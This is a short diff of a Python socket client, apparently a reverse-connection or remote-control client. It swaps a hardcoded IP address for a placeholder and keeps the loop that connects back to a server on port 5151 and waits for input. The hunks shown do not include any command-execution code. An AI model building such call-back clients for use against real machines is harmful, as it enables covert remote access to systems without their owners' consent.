@@ -11,7 +11,7 @@ def connect ():
     global s
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 5151
-    host = "10.36.103.147"
+    host = "SERVER IP ADDRESS GOES HERE"
     while 1:
         try:
             print("[!] Trying to connect to %s:%s" %(host, port))
@@ -58,7 +58,6 @@ def send(args):
 
 while active:
     connect()
-    #while connected == True:
     receive()
 
 s.close()
